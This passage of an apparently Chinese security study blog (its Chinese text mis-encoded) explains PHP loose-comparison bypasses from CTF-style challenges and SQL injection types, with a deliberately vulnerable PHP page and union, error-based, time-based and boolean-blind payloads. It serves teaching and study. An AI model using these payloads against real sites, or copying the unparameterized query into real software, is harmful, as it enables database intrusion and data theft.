class="hljs-variable">$test</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$test</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$test</span>)===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­ä¼ å…¥çš„æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œç„¶åå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ï¼Œå¹¶ä¸”æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¸èƒ½å’Œadminç›¸ç­‰ï¼Œå¹¶ä¸”å°†æ¯ä¸ªå€¼è½¬åŒ–ä¸ºintç±»å‹ï¼Œå†åˆ¤æ–­ä¼ å…¥çš„æ•°ç»„æ˜¯å¦æœ‰adminï¼Œæœ‰åˆ™è¿”å›flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payload: test[]=<span class="hljs-number">0</span><span class="hljs-comment">//å¯ä»¥ç»•è¿‡</span><br></code></pre></td></tr></table></figure><p>å®˜æ–¹æ‰‹å†Œå¯¹array_searchçš„ä»‹ç»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">array_search</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span> [], <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">false</span> )<br></code></pre></td></tr></table></figure><p>$needleï¼Œ$haystackå¿…éœ€ï¼Œ$strictå¯é€‰  å‡½æ•°åˆ¤æ–­$haystackä¸­çš„å€¼æ˜¯å­˜åœ¨$needleï¼Œå­˜åœ¨åˆ™è¿”å›è¯¥å€¼çš„é”®å€¼ ç¬¬ä¸‰ä¸ªå‚æ•°é»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueåˆ™ä¼šè¿›è¡Œä¸¥æ ¼è¿‡æ»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$a</span>));  <span class="hljs-comment">// int(0) ==&gt; è¿”å›é”®å€¼0</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;1admin&quot;</span>,<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// int(1) ==&gt; è¿”å›é”®å€¼1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>array_searchå‡½æ•° ç±»ä¼¼äº &#x3D;&#x3D; ä¹Ÿå°±æ˜¯$a &#x3D;&#x3D;â€adminâ€ å½“ç„¶æ˜¯$a&#x3D;0  å½“ç„¶å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºtrueåˆ™å°±ä¸èƒ½ç»•è¿‡ã€‚</p><h4 id="strcmpæ¼æ´ç»•è¿‡-php-v-lt-5-3"><a href="#strcmpæ¼æ´ç»•è¿‡-php-v-lt-5-3" class="headerlink" title="strcmpæ¼æ´ç»•è¿‡ php -v &lt;5.3"></a>strcmpæ¼æ´ç»•è¿‡ php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;***************&quot;</span><br>     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Right!!!login success&quot;</span>;n<br>            <span class="hljs-keyword">exit</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong password..&quot;</span>;<br>        &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>strcmpæ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœstr1&lt;str2 åˆ™è¿”å›&lt;0 å¦‚æœstr1å¤§äºstr2è¿”å›&gt;0 å¦‚æœä¸¤è€…ç›¸ç­‰ è¿”å›0</li><li>æˆ‘ä»¬æ˜¯ä¸çŸ¥é“$passwordçš„å€¼çš„ï¼Œé¢˜ç›®è¦æ±‚strcmpåˆ¤æ–­çš„æ¥å—çš„å€¼å’Œ$passwordå¿…éœ€ç›¸ç­‰ï¼Œstrcmpä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯ä¸ªæ•°ç»„ä¼šæ€ä¹ˆæ ·å‘¢</li><li>æˆ‘ä»¬ä¼ å…¥ password[]&#x3D;xxx å¯ä»¥ç»•è¿‡ æ˜¯å› ä¸ºå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯åˆ¤æ–­å…¶ç›¸ç­‰</li><li>payload: password[]&#x3D;xxx</li></ul><h4 id="switchç»•è¿‡"><a href="#switchç»•è¿‡" class="headerlink" title="switchç»•è¿‡"></a>switchç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;4admin&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$a</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail1&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail2&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail3&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sucess&quot;</span>;  <span class="hljs-comment">//ç»“æœè¾“å‡ºsuccess;</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;failall&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åŸç†å’Œä¸Šé¢ä¸€æ ·</p><h4 id="is-numericï¼ˆï¼‰ã€int-å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#is-numericï¼ˆï¼‰ã€int-å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="is_numericï¼ˆï¼‰ã€int()å¼ºåˆ¶ç±»å‹è½¬æ¢"></a>is_numericï¼ˆï¼‰ã€int()å¼ºåˆ¶ç±»å‹è½¬æ¢</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxxx&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;The time must be number.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &lt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">2</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too short.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &gt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">3</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too long.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span>&#123; <br>                <span class="hljs-title function_ invoke__">sleep</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>        &#125; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>çŸ¥è¯†ç‚¹ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">()</span></span>ï¼Œä¸èƒ½æ­£ç¡®è½¬æ¢çš„ç±»å‹æœ‰åå…­è¿›åˆ¶å‹å­—ç¬¦ä¸²ã€ç§‘å­¦è®¡æ•°æ³•å‹å­—ç¬¦ä¸²<br><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">()</span></span>æ”¯æŒæ™®é€šæ•°å­—å‹å­—ç¬¦ä¸²ã€ç§‘å­¦è®°æ•°æ³•å‹å­—ç¬¦ä¸²ã€éƒ¨åˆ†æ”¯æŒåå…­è¿›åˆ¶<span class="hljs-number">0</span>xå‹å­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯æ•°å­—ï¼Œç„¶åå†è¿›è¡Œinté•¿çŸ­çš„é™å®šåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯åªèƒ½é™å®šåœ¨5184000L&lt;  time &lt;  7776000</p><p>é€šè¿‡is_number() èƒ½ä¼ å…¥ç§‘å­¦è®¡æ•°æ³•ï¼Œæ¥è¿›è¡Œç»•è¿‡ã€‚</p><p>æ‰€ä»¥æ ¹æ®intä¸èƒ½å¤„ç†ç§‘å­¦è®¡æ•°æ³•ï¼Œè€Œåœ¨is_numberä¸Šèƒ½å¤„ç†æ¥è§£å†³ã€‚</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><h4 id="åˆ†ç±»ï¼š"><a href="#åˆ†ç±»ï¼š" class="headerlink" title="åˆ†ç±»ï¼š"></a>åˆ†ç±»ï¼š</h4><p>æŒ‰ç…§å‚æ•°ç±»å‹åˆ†ç±»ï¼ŒæŒ‰æ•°æ®åº“è¿”å›çš„ç»“æœåˆ†ç±»ç­‰ã€‚</p><h5 id="æŒ‰ç…§å‚æ•°ç±»å‹åˆ†ç±»"><a href="#æŒ‰ç…§å‚æ•°ç±»å‹åˆ†ç±»" class="headerlink" title="æŒ‰ç…§å‚æ•°ç±»å‹åˆ†ç±»"></a>æŒ‰ç…§å‚æ•°ç±»å‹åˆ†ç±»</h5><p>æŒ‰ç…§å‚æ•°ç±»å‹å¯ä»¥åˆ†ä¸ºä¸¤ç±»:æ•°å€¼å‹ã€å­—ç¬¦å‹</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">æ•°å­—å‹æ³¨å…¥<br>åŠ å•å¼•å· é”™è¯¯å‡ºå¼‚å¸¸<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> æ­£å¸¸<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> å¼‚å¸¸<br><br>å­—ç¬¦å‹æ³¨å…¥<br>åŠ å•å¼•å· é”™è¯¯å‡ºå¼‚å¸¸<br><span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1 æ­£å¸¸</span><br><span class="hljs-string">and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">2</span> å¼‚å¸¸<br></code></pre></td></tr></table></figure><h5 id="æ•°å€¼å‹"><a href="#æ•°å€¼å‹" class="headerlink" title="æ•°å€¼å‹"></a>æ•°å€¼å‹</h5><p>ç¨‹åºæ‹¼æ¥çš„å˜é‡å€¼æ²¡æœ‰è¢«å¼•å·åŒ…è£¹ã€‚æ•°å€¼å‹æ³¨å…¥æ˜¯æ— è§†phpçš„gpcæˆ–è€…addslashesã€mysql_real_escape_string,mysql_escape_stringæˆ–è€…å…¶ä»–å¯¹å¼•å·æœ‰è½¬ä¹‰å‡½æ•°çš„å½±å“çš„ã€‚å¦‚æœç¨‹åºæ²¡æœ‰å¯¹å…³é”®å­—æˆ–è€…ç‰¹æ®Šç¬¦å·è¿‡æ»¤æˆ–è€…è¿‡æ»¤ä¸ä¸¥(æ¯”å¦‚æ²¡æœ‰è¿‡æ»¤unionã€selectç­‰å…³é”®å­—,å¯ä»¥ä½¿ç”¨è”åˆæ³¨å…¥,è¿‡æ»¤äº†unionã€selectç­‰å…³é”®å­—,å¯ä»¥ç”¨ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥ç­‰æ–¹æ³•)</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS `test`;<br>CREATE TABLE IF NOT EXISTS `news` (<br>  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,<br>  `title` varchar(30) CHARACTER SET utf8 NOT NULL,<br>  `content` varchar(256) CHARACTER SET utf8 NOT NULL,<br>  PRIMARY KEY (`tid`)<br>) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;<br><br>INSERT INTO `news` (`tid`, `title`, `content`) VALUES<br>(1, &#x27;æ–°é—»1&#x27;, &#x27;è¿™æ˜¯ç¬¬ä¸€ç¯‡æ–‡ç« &#x27;),<br>(2, &#x27;æ–°é—»2&#x27;, &#x27;è¿™æ˜¯ç¬¬äºŒç¯‡æ–‡ç« &#x27;);<br></code></pre></td></tr></table></figure><p>sqlinjection.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;è¿æ¥æ•°æ®åº“å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ‚¨å¡«å†™çš„æ•°æ®åº“&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM news&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>()); <span class="hljs-comment">//sqlå‡ºé”™ä¼šæŠ¥é”™ï¼Œæ–¹ä¾¿è§‚å¯Ÿ</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;æ–°é—»&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$result</span>, MYSQL_ASSOC))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$row[&#x27;tid&#x27;]&#125;</span>    <span class="hljs-subst">&#123;$row[&#x27;title&#x27;]&#125;</span>    <span class="hljs-subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨è”åˆæ³¨å…¥æµ‹è¯•æœ‰å›æ˜¾å¹¶ä¸”æ˜¯ç¬¬ä¸‰ä¸ªå­—æ®µåœ¨é¡µé¢æœ‰å›æ˜¾,é‚£ä¹ˆå¯ä»¥ä½¿ç”¨è”åˆæ³¨å…¥(è¿™é‡Œå‡è®¾testè¡¨æ˜¯ä¸‰ä¸ªå­—æ®µ):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=1 union select 1,2,user() --<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾å¯ä»¥å°è¯•ä¸‹çœ‹èƒ½ä¸èƒ½æŠ¥é”™æ³¨å…¥,æ¯”å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=1 or updatexml(2,concat(0x7e,(version())),0) --<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¯•ä¸‹æ—¶é—´ç›²æ³¨,æ¯”å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=3 and sleep(3) --<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¯•ä¸‹boolç›²æ³¨(çœ‹èƒ½ä¸èƒ½å¼•èµ·é¡µé¢å˜åŒ–):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=3 and (length(database()))&gt;10 --<br></code></pre></td></tr></table></figure><p><strong>æ³¨</strong>: ä¸Šé¢çš„æµ‹è¯•æ˜¯åœ¨å¯¹åº”çš„æ³¨å…¥æ–¹å¼ä¸­å…³é”®å­—æˆ–è€…ç‰¹æ®Šç¬¦å·æ²¡æœ‰è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹,çœŸå®ç¯å¢ƒä¸­ä¹Ÿä¸çŸ¥é“åˆ°åº•è¿‡æ»¤äº†ä»€ä¹ˆæˆ–è€…æ˜¯å…¶ä»–åŸå› ã€‚åœ¨ä¸èƒ½çœ‹åˆ°æºç çš„è€Œæƒ…å†µä¸‹,ä¹Ÿåªèƒ½fuzz(éšæœºæµ‹è¯•)ã€‚</p><p><strong>æ³¨</strong>: ä¸Šé¢è¿™äº›åªæ˜¯æä¾›å¤§è‡´çš„æ€è·¯ã€‚è”åˆæ³¨å…¥,æŠ¥é”™æ³¨å…¥,ç›²æ³¨ä»¥åŠå…¶ä»–æ³¨å…¥æ–¹å¼æœ‰å¾ˆå¤š,è¿˜å¯ä»¥ç»“åˆç¼–ç ç­‰æˆ–è€…å…¶ä»–å¤§ä½¬æ€»ç»“çš„ä»€ä¹ˆæ–¹å¼ç»•è¿‡,éœ€è¦ç”¨åˆ°çš„æ—¶å€™å¯ä»¥æœé›†èµ„æ–™è¯¦ç»†çš„å­¦ä¹ ã€‚</p><h5 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h5><p>ç¨‹åºæ‹¼æ¥çš„å˜é‡è¢«å¼•å·åŒ…è£¹ã€‚å­—ç¬¦å‹æ³¨å…¥æ˜¯æ˜¯å—phpçš„gpcæˆ–è€…addslashesã€mysql_real_escape_string,mysql_escape_stringæˆ–è€…å…¶ä»–å¯¹å¼•å·æœ‰è½¬ä¹‰çš„å‡½æ•°å½±å“çš„ã€‚å¦‚æœç¨‹åºæ²¡æœ‰å¯¹å¼•å·å’Œå…³é”®å­—æˆ–è€…ç‰¹æ®Šç¬¦å·è¿‡æ»¤æˆ–è€…è¿‡æ»¤ä¸ä¸¥,å¯èƒ½ä¼šå¯¼è‡´sqlæ³¨å…¥ã€‚</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]; p = <span class="hljs-number">100</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where p = &#x27;3&#x27; and &#x27;1&#x27;=&#x27;2&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>é—­åˆå•å¼•å·,å¦‚æœä½¿ç”¨è”åˆæ³¨å…¥æµ‹è¯•æœ‰å›æ˜¾å¹¶ä¸”æ˜¯ç¬¬ä¸‰ä¸ªå­—æ®µåœ¨é¡µé¢æœ‰å›æ˜¾,é‚£ä¹ˆå¯ä»¥ä½¿ç”¨è”åˆæ³¨å…¥(è¿™é‡Œå‡è®¾testè¡¨æ˜¯ä¸‰ä¸ªå­—æ®µ):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; union select 1,2,user() --<br></code></pre></td></tr></table></figure><p>é—­åˆå•å¼•å·,æ²¡æœ‰å›æ˜¾å¯ä»¥å°è¯•ä¸‹çœ‹èƒ½ä¸èƒ½æŠ¥é”™æ³¨å…¥,æ¯”å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; or updatexml(2,concat(0x7e,(version())),0) --<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¯•ä¸‹æ—¶é—´ç›²æ³¨,æ¯”å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; and sleep(5) --<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¯•ä¸‹boolç›²æ³¨(çœ‹èƒ½ä¸èƒ½å¼•èµ·é¡µé¢å˜åŒ–):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; and (length(database()))&gt;10 --<br></code></pre></td></tr></table></figure><p><strong>æ³¨</strong>: 